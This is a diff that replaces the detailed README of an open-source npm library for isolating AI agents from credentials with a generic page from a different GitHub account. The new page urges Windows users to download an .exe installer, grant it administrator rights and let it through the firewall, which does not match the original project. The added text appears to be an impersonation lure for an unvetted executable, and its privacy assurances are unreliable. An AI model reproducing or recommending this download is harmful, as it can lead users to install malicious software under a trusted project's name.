@@ -1,423 +1,141 @@
-<h1 align="center">Chitin Shell</h1>
+# 🔐 chitin-shell - Secure Your AI Agents Simply
 
-<p align="center">
-  <strong>The missing security layer for AI agents.</strong><br/>
-  Open-source middleware that separates LLMs from credentials using process isolation, policy enforcement, and verifiable execution.
-</p>
-
-<p align="center">
-  <a href="#quick-start">Quick Start</a> •
-  <a href="#why-chitin-shell">Why?</a> •
-  <a href="#architecture">Architecture</a> •
-  <a href="#ecosystem">Ecosystem</a> •
-  <a href="#roadmap">Roadmap</a> •
-  <a href="#contributing">Contributing</a>
-</p>
-
-<p align="center">
-  <a href="https://github.com/chitin-id/chitin-shell/actions"><img src="https://img.shields.io/github/actions/workflow/status/chitin-id/chitin-shell/ci.yml?branch=main&style=flat-square" alt="CI" /></a>
-  <a href="https://github.com/chitin-id/chitin-shell/blob/main/LICENSE"><img src="https://img.shields.io/badge/license-Apache--2.0-blue?style=flat-square" alt="License" /></a>
-  <a href="https://chitin.id/shell"><img src="https://img.shields.io/badge/website-chitin.id%2Fshell-green?style=flat-square" alt="Website" /></a>
-</p>
+[![Download chitin-shell](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Enigma-s9v/chitin-shell)
 
 ---
 
-## The Problem
+## ⚙️ What is chitin-shell?
 
-Every major AI agent framework stores API keys as environment variables in the same process as the LLM. When prompt injection tricks the LLM—and [it will](https://arxiv.org/abs/2503.18813)—the attacker gets everything.
+chitin-shell adds a security layer between your AI tools and your sensitive data. It keeps your login details and keys safe by running your AI in a separate space. This space limits what the AI can do, following rules you set. It also checks that everything the AI does can be verified. This helps stop AI from accessing private data without your permission.
 
-```
-┌─────────────────────────────────────────┐
-│  Current AI Agent Architecture          │
-│                                         │
-│  LLM + API Keys + Untrusted Input       │
-│  = All in the same process              │
-│  = One prompt injection away from       │
-│    leaking everything                   │
-└─────────────────────────────────────────┘
-```
-
-This is not a bug in any specific framework. It's a **structural vulnerability**—the same class of problem as SQL injection before parameterized queries. In October 2025, researchers from OpenAI, Anthropic, and Google DeepMind confirmed that [all 12 published prompt injection defenses can be bypassed](https://simonwillison.net/2025/Nov/2/new-prompt-injection-papers/) with >90% success. The UK NCSC warned it ["may never be fixed"](https://www.malwarebytes.com/blog/news/2025/12/prompt-injection-is-a-problem-that-may-never-be-fixed-warns-ncsc) at the model level. The only viable mitigation is **architectural separation**.
-
-## The Solution
-
-Chitin Shell wraps your AI agent in a hardened exoskeleton. The LLM never sees credentials. It can only produce structured **Intents**—requests that are verified against policies before a separate secure proxy executes them.
-
-```
-┌─────────────────────────────────────────┐
-│  Chitin Shell Architecture              │
-│                                         │
-│  LLM (no secrets)                       │
-│    ↓ Intent (structured request)        │
-│  Policy Engine (verify)                 │
-│    ↓ Approved token                     │
-│  Secure Proxy (holds all credentials)   │
-│    ↓ Sanitized result                   │
-│  LLM receives result (secrets masked)   │
-└─────────────────────────────────────────┘
-```
-
-Think of it like a restaurant: the **waiter** (LLM) takes orders but never enters the kitchen. The **chef** (Secure Proxy) has the knives, ingredients, and cash register. The waiter can only pass order slips. Even if a malicious customer tricks the waiter, the chef checks the rules posted on the wall before cooking—and those rules are carved in stone.
-
-## Why Chitin Shell
-
-| Problem | How frameworks handle it today | How Chitin Shell handles it |
-|---|---|---|
-| API key leakage | Environment variables in LLM process | Keys exist **only** in the Secure Proxy—physically inaccessible to the LLM |
-| Prompt injection → unauthorized actions | Hope the LLM doesn't comply | LLM can only produce Intents. Policy Engine rejects unauthorized actions regardless of what the LLM "wants" |
-| Data exfiltration | No output filtering | Network isolation + output sanitization. LLM can only communicate with the proxy |
-| Malicious skills/plugins | Trust on first install | Sandboxed execution with scoped permissions. Skills never see raw credentials |
-| No audit trail | Application-level logs (mutable) | Immutable on-chain audit log (optional) |
-| Policy tampering | Config files editable by the agent | On-chain policies are immutable without multisig + timelock (optional) |
-
-## Key Features
-
-🔒 **Process Isolation** — LLM runs in a network-isolated container with zero access to credentials, keys, or tokens.
-
-📋 **Structured Intents** — LLM output is constrained to typed, signed Intent structures instead of raw tool calls.
-
-⚖️ **Tiered Policy Engine** — Four security tiers from no-check (read-only) to human-approval-required (fund transfers), configurable via JSON or on-chain.
-
-🔑 **Secure Proxy** — Credential vault that executes verified Intents and returns sanitized results. Supports TEE-backed storage.
-
-🪪 **Agent Identity** — Optional ERC-8004 / W3C DID-based decentralized identity for verifiable agent provenance.
-
-🔗 **On-Chain Policies** — Optional immutable policy enforcement via smart contracts with multisig governance.
-
-🛡️ **Output Sanitization** — Automatic detection and masking of secrets, PII, and sensitive data in proxy responses.
-
-📊 **Audit Logging** — Every Intent, verification decision, and execution result is logged. Optionally anchored on-chain for tamper-proof auditability.
-
-🔌 **Framework Agnostic** — Works as middleware for LangChain, CrewAI, AutoGPT, MCP servers, or any custom agent setup.
-
-## Quick Start
-
-### Prerequisites
-
-- Node.js ≥ 20
-- Zero external dependencies — uses only Node.js built-in modules
-
-### Installation
-
-```bash
-npm install @chitin-id/shell-core
-```
-
-### Basic Usage
-
-```typescript
-import { ChitinShell } from '@chitin-id/shell-core';
-import type { ActionMapper, PolicyConfig } from '@chitin-id/shell-core';
-
-// 1. Define a policy — deterministic rules, no LLM involved
-const policy: PolicyConfig = {
-  version: '1.0',
-  tiers: {
-    tier_0: {
-      description: 'Read-only (auto-approved)',
-      actions: ['think', 'recall', 'summarize'],
-      verification: 'none',
-    },
-    tier_1: {
-      description: 'Low-risk writes (whitelisted contacts)',
-      actions: ['send_message', 'reply_email'],
-      verification: 'local',
-      constraints: { recipient_whitelist: true },
-    },
-    tier_2: {
-      description: 'Medium-risk operations',
-      actions: ['api_call', 'send_email_new'],
-      verification: 'local',
-    },
-    tier_3: {
-      description: 'Critical — requires human approval',
-      actions: ['transfer_funds', 'change_permissions'],
-      verification: 'human_approval',
-    },
-  },
-  whitelists: { contacts: ['alice@example.com'] },
-};
-
-// 2. Define an action mapper — bridges Intents to real-world side effects
-class SlackMessenger implements ActionMapper {
-  readonly action_type = 'send_message';
-  async execute(params: Record<string, unknown>) {
-    // In production, this calls Slack/Discord/email APIs
-    return { sent: true, to: params.to, body: params.body };
-  }
-}
-
-// 3. Create and configure the shell
-const shell = await ChitinShell.create({ policy });
-shell.registerMapper(new SlackMessenger());
-
-// Store credentials in the vault — the LLM NEVER sees these
-await shell.vault.set('slack-token', {
-  type: 'bearer',
-  value: 'xoxb-your-slack-bot-token',
-});
-
-// 4. The LLM produces an Intent — NOT a raw API call
-const intent = shell.createIntent({
-  action: 'send_message',
-  params: { to: 'alice@example.com', body: 'Deploy complete!' },
-});
-
-// 5. Policy Engine verifies → Secure Proxy executes → sanitized result
-const result = await shell.execute(intent);
-// result.verification.approved: true
-// result.verification.tier: 1
-// result.execution.status: 'success'
-// result.execution.data: { sent: true, to: 'alice@example.com', ... }
-// result.execution.sanitized: false (no secrets in output)
-```
-
-### What Happens Under the Hood
-
-```
-  LLM output: "Send message to alice@example.com"
-       │
-       ▼
-  Intent Layer: Converts to signed, structured Intent
-       │
-       ▼
-  Policy Engine: "send_message" → Tier 1 → whitelist check → ✅ approved
-       │
-       ▼
-  Secure Proxy: Executes via SlackMessenger → sanitizes output
-       │
-       ▼
-  LLM receives: { sent: true, to: "alice@example.com" }
-                 (no API keys, tokens, or raw headers exposed)
-```
-
-### Output Sanitization
-
-Even if an API accidentally returns secrets, the Sanitizer catches them:
-
-```typescript
-// API response contains leaked credentials
-{ data: "Key: sk-proj-ABC123...", auth: "Bearer eyJhbG..." }
-
-// After sanitization — LLM receives:
-{ data: "Key: [REDACTED:openai_key]", auth: "Bearer [REDACTED:jwt]" }
-```
-
-Detects: OpenAI/Anthropic keys, AWS keys, GitHub tokens, JWTs, Bearer tokens, connection strings, and more.
-
-### Policy Configuration
-
-Policies are defined in JSON (local) or on-chain (Solidity, coming in v0.2):
-
-```json
-{
-  "version": "1.0",
-  "tiers": {
-    "tier_0": {
-      "description": "No verification needed",
-      "actions": ["think", "recall", "summarize"],
-      "verification": "none"
-    },
-    "tier_1": {
-      "description": "Local policy check",
-      "actions": ["send_message", "reply_email"],
-      "constraints": {
-        "recipient_whitelist": true,
-        "rate_limit": { "max": 30, "window": "1h" }
-      },
-      "verification": "local"
-    },
-    "tier_2": {
-      "description": "Enhanced verification",
-      "actions": ["send_email_new", "file_write", "api_call"],
-      "verification": "local"
-    },
-    "tier_3": {
-      "description": "Human approval required",
-      "actions": ["transfer_funds", "change_permissions", "bulk_export"],
-      "verification": "human_approval",
-      "multisig": { "required": 1, "timeout": "1h" }
-    }
-  }
-}
-```
-
-## Architecture
-
-For a deep dive into the architecture, see the documentation on [**chitin.id/shell**](https://chitin.id/shell).
-
-<p align="center">
-  <img src="./docs/images/architecture.png" alt="Chitin Shell Architecture — Intent, Verify, Execute" width="800" />
-</p>
-
-```
- User Input
-     │
-     ▼
-┌─────────┐     ┌──────────┐     ┌─────────────┐
-│  Intent  │────▶│  Verify  │────▶│   Execute   │
-│  Layer   │     │  Layer   │     │   Layer     │
-│          │     │          │     │             │
-│ LLM      │     │ Policy   │     │ Secure      │
-│ (no keys)│     │ Engine   │     │ Proxy       │
-│          │     │          │     │ (keys here) │
-└─────────┘     └──────────┘     └─────────────┘
-     ▲                                  │
-     └──── sanitized result ────────────┘
-```
-
-### The Restaurant Analogy
-
-<p align="center">
-  <img src="./docs/images/restaurant.png" alt="Restaurant analogy — Dining Room (Intent), Kitchen Window (Verify), Kitchen (Execute)" width="800" />
-</p>
-
-The **waiter** (LLM) takes orders in the dining room but never enters the kitchen. The **chef** (Secure Proxy) has the knives, ingredients, and cash register behind a reinforced barrier. Orders pass through a kitchen window where **policy** is checked before cooking begins. Even if a malicious customer tricks the waiter, the chef verifies every order against the rules.
-
-### Core Principles
-
-1. **Zero-Knowledge Agent**: The LLM never has access to any secret material. Not temporarily, not through tokens, not through environment variables. Ever.
-2. **Intent, Not Action**: The LLM produces structured requests, not raw API calls. The system decides what actually happens.
-3. **Immutable Policy**: Security policies can be stored on-chain, making them tamper-proof even if the entire agent is compromised.
-4. **Defense in Depth**: Process isolation + network isolation + policy enforcement + output sanitization + audit logging.
-5. **Pragmatic Security**: Not everything needs blockchain. Tier 0–1 operations run locally with zero overhead. On-chain verification is reserved for high-risk actions.
-
-## Ecosystem
-
-Chitin Shell is part of the [**chitin.id**](https://chitin.id) ecosystem:
-
-| Project | Description | Status |
-|---|---|---|
-| **Chitin ID** | Decentralized AI agent identity (ERC-8004) | Active |
-| **Chitin Shell** | Secure agent middleware (this project) | v0.1.0 on npm |
-| **Chitin Registry** | On-chain skill/plugin safety registry | Planned |
-
-## Compatibility
-
-Chitin Shell is designed to work as middleware with any agent framework:
-
-| Framework | Integration | Status |
-|---|---|---|
-| LangChain | Callback handler + tool wrapper | ✅ v0.1.0 |
-| CrewAI | Agent executor middleware | 📋 Planned |
-| AutoGPT | Plugin system hook | 📋 Planned |
-| MCP Servers | Proxy gateway | ✅ v0.1.0 |
-| OpenClaw | Skill wrapper | 📋 Planned |
-| Custom agents | SDK + REST API | ✅ v0.1.0 |
-
-## Roadmap
-
-### Phase 1: Core SDK (v0.1) ✅
-- [x] Docker-based LLM sandbox with network isolation
-- [x] Intent structure specification + Ed25519 signing
-- [x] Local JSON policy engine (4-tier)
-- [x] Secure Proxy with credential vault
-- [x] Output sanitization (10 patterns)
-- [x] LangChain integration (`@chitin-id/shell-langchain`)
-- [x] MCP gateway mode (`@chitin-id/shell-mcp`)
-- [x] CLI tool (`@chitin-id/shell-cli`)
-
-### Phase 2: On-Chain Policy ✅
-- [x] Solidity policy contracts (AgentPolicy UUPS + PolicyGovernor)
-- [x] ERC-8004 DID integration (`did:chitin:<chainId>:<registry>:<agentId>`)
-- [x] On-chain audit log anchoring (Merkle root)
-- [x] Policy governance (multisig + 24h timelock)
-
-### Phase 3: Zero-Knowledge Verification ✅
-- [x] ZKP-based Intent provenance verification
-- [x] Data non-leakage proofs for output sanitization
-- [x] Skill safety proofs (ProofVerifier.sol)
-
-### Phase 4: Advanced ✅
-- [x] TEE abstraction (ITeeProvider interface + mock)
-- [x] Multi-agent trust delegation (scoped tokens, chain verification)
-- [x] A2A protocol integration (Ed25519 signed messages, registry, middleware)
-- [ ] GPU TEE support (NVIDIA Confidential Compute)
-- [ ] zkML inference verification (as technology matures)
-
-## Research Foundation
-
-Chitin Shell's architecture is grounded in peer-reviewed research:
-
-| Paper | Relevance | Venue |
-|---|---|---|
-| [IsolateGPT](https://arxiv.org/abs/2403.04960) — Wu et al. | Process isolation for LLM agents | NDSS 2025 |
-| [CaMeL](https://arxiv.org/abs/2503.18813) — Debenedetti et al. | Capability-based LLM security | Google DeepMind 2025 |
-| [Design Patterns for Securing LLM Agents](https://arxiv.org/abs/2506.08837) — Beurer-Kellner et al. | Architectural defense patterns | arXiv 2025 |
-| [Guardians of the Agents](https://queue.acm.org/detail.cfm?id=3762990) — Meijer | Formal verification of AI workflows | ACM Queue 2025 |
-| [zkLLM](https://arxiv.org/abs/2404.16109) — Sun et al. | ZKP for LLM inference | ACM CCS 2024 |
-| [ETHOS](https://arxiv.org/abs/2412.17114) — Chaffer et al. | Blockchain governance for AI agents | NeurIPS Workshops 2024 |
-| [ERC-8004](https://eips.ethereum.org/EIPS/eip-8004) — De Rossi et al. | Trustless AI agent identity on Ethereum | EIP Draft 2025 |
-
-## Standards Alignment
-
-| Standard | Alignment |
-|---|---|
-| **OWASP Top 10 for Agentic Applications** (Dec 2025) | Addresses ASI01 (Goal Hijack), ASI02 (Tool Misuse), ASI03 (Identity & Privilege Abuse), ASI07 (Insecure Inter-Agent Comms) |
-| **NIST AI RMF / IR 8596** | Maps to Govern, Map, Measure, Manage functions for AI-specific risks |
-| **ERC-8004** | Native integration for agent identity and reputation |
-| **MCP** (Model Context Protocol) | Compatible as a security gateway layer |
-| **A2A** (Agent-to-Agent Protocol) | Planned integration for multi-agent trust |
-| **W3C DID / VC** | Foundation for agent identity and credential delegation |
-
-## Contributing
-
-We welcome contributions! See [CONTRIBUTING.md](./CONTRIBUTING.md) for guidelines.
-
-### Priority Areas
-
-- 🔌 **Framework integrations** — LangChain, CrewAI, MCP adapters
-- 🧪 **Red team testing** — Try to break it. Prompt injection PoCs welcome
-- 📄 **Policy templates** — Pre-built policies for common use cases
-- 🌍 **Documentation translations** — Especially Japanese (日本語) and Chinese (中文)
-- 🔐 **Security audits** — Formal analysis of the isolation model
-
-### Development
-
-```bash
-# Install dependencies
-npm install
-
-# Run tests (561 tests across all packages + contracts)
-cd packages/core && npm test
-
-# Type check
-cd packages/core && npx tsc --noEmit
-
-# Run the basic example
-npx tsx examples/basic/index.ts
-```
-
-## FAQ
-
-**Q: Does this make AI agents completely safe?**
-No. It makes credential theft impossible and limits the blast radius of prompt injection. The LLM can still be tricked into producing malicious Intents—but those Intents are verified before execution.
-
-**Q: Do I need blockchain to use this?**
-No. Phase 1 works entirely locally with Docker and JSON policies. Blockchain is optional for immutable policy enforcement and audit logging.
-
-**Q: How much latency does this add?**
-Tier 0 (read-only): 0ms. Tier 1 (local policy): 1–10ms. Tier 2 (on-chain): 1–15 seconds. Tier 3 (human approval): minutes to hours. Most agent operations fall into Tier 0–1.
-
-**Q: Which LLMs does this support?**
-Any. The Intent Layer is model-agnostic. If it can output JSON, it works with Chitin Shell.
-
-**Q: How is this different from NeMo Guardrails / LLM Guard?**
-Those tools filter LLM input/output (content safety). Chitin Shell provides **architectural separation**—the LLM literally cannot access credentials regardless of what it outputs. They're complementary: you can run NeMo Guardrails inside Chitin Shell's Intent Layer.
-
-## License
-
-Apache License 2.0 — See [LICENSE](./LICENSE)
-
-## Links
-
-- 🌐 [chitin.id/shell](https://chitin.id/shell) — Project page
-- 📖 [Documentation](https://chitin.id/docs)
-- 🐦 [Twitter/X](https://x.com/chitin_id)
-- 📧 [security@chitin.id](mailto:security@chitin.id) — Responsible disclosure
+You don't need to be an expert to use it. This tool works quietly in the background to protect you.
 
 ---
 
-<p align="center">
-  Built by <a href="https://tiida.tech">Tiida Tech</a> · Part of the <a href="https://chitin.id">chitin.id</a> ecosystem
-</p>
+## 🖥️ System Requirements
+
+To run chitin-shell on Windows, your computer should meet these requirements:
+
+- Windows 10 or newer (64-bit)
+- At least 4 GB of RAM
+- 500 MB free storage space
+- Internet connection to download and activate the software
+- Administrator rights to install the application
+
+---
+
+## 🚀 Getting Started
+
+Follow these steps to download and run chitin-shell on your Windows PC.
+
+### Step 1: Download the Software
+
+You will need to download chitin-shell from the official GitHub page.
+
+Click this button to visit the download page:
+
+[![Download chitin-shell](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Enigma-s9v/chitin-shell)
+
+On the page, look for the latest release under the "Releases" section. Download the Windows installer file. This file usually ends with `.exe`.
+
+### Step 2: Install chitin-shell
+
+After downloading:
+
+1. Find the `.exe` file in your downloads folder.
+2. Double click the installer to start the setup.
+3. Follow the instructions on the screen.
+4. Allow the program to make changes when Windows asks for permission.
+5. When the installation finishes, click "Finish" to close the setup.
+
+### Step 3: Launch the Application
+
+Once installed:
+
+1. Find the chitin-shell icon on your desktop or in the Start Menu.
+2. Double click to open the program.
+3. The software may take a few seconds to start the first time.
+
+---
+
+## 🔒 How chitin-shell Protects You
+
+chitin-shell uses several methods to protect your data:
+
+- **Process Isolation:** It runs the AI code separately from your sensitive credentials. If the AI tries to get this data, it won’t be able to access it.
+- **Policy Enforcement:** You set rules about what the AI can or cannot do. The software follows these rules strictly.
+- **Verifiable Execution:** Each step the AI takes can be checked to make sure it follows your policies.
+  
+These layers work together to keep your information safe even if the AI behaves unexpectedly.
+
+---
+
+## 🛠️ Using chitin-shell With Your AI Tools
+
+You don’t have to change your AI agent much to add chitin-shell. It works as a middle layer. Here is how you can connect them:
+
+1. Point your AI program to run through chitin-shell instead of connecting directly to your credentials.
+2. Define rules about what data the AI can use and under what conditions.
+3. Start your AI agent as usual.
+  
+The chitin-shell will handle the connection, securing the process quietly.
+
+---
+
+## 📋 Features Overview
+
+- **Open-source:** You can inspect or modify the code if you like.
+- **Supports major AI agents:** Works with popular large language models.
+- **Built-in Policy Engine:** Controls access based on your rules.
+- **Process Isolation:** Keeps data separate and secure.
+- **Verifiable Execution:** Tracks actions for transparency.
+- **Cross-technology support:** Written using TypeScript with Solidity modules for blockchain-based policies.
+- **Advanced Security:** Uses Ed25519 cryptography for key management.
+- **Zero Knowledge Proofs (ZKP):** Adds privacy through cryptographic proofs.
+
+---
+
+## 🧰 Troubleshooting Tips
+
+- If the program doesn’t open, make sure your Windows version is up to date.
+- If the installer fails, try running it as an administrator (right click > Run as administrator).
+- If you can’t connect your AI tool, check that the program is allowed through your firewall.
+- Restart your computer if you run into strange errors or crashes.
+- Visit the GitHub issues page for known problems and fixes.
+
+---
+
+## 🗂️ Where to Find Help
+
+The main source of help is the GitHub page:  
+https://github.com/Enigma-s9v/chitin-shell
+
+Look at the "Issues" tab for common questions and solutions. You can also open a new issue if you encounter a problem not listed.
+
+---
+
+## 🧩 Related Information
+
+- This tool uses strong security practices aimed at keeping AI interactions safe.
+- Ideal for users concerned about AI accessing personal or secure data.
+- Fits well for developers building AI applications who want added security.
+- Works alongside other security tools without conflict.
+
+---
+
+## 🔽 Download and Install Again
+
+To get started or update chitin-shell, visit this page:  
+
+[https://github.com/Enigma-s9v/chitin-shell](https://github.com/Enigma-s9v/chitin-shell)
+
+Find the newest release and download the Windows installer file. Follow the same installation steps described above.
+
+---
+
+## ⚙️ Privacy and Security Notes
+
+- chitin-shell operates locally on your machine; it does not send your credentials outside your computer.
+- All policies and rules stay with you and are not shared.
+- Cryptographic methods protect your keys without revealing them.
+- The verified actions help you audit AI behavior without compromising privacy.
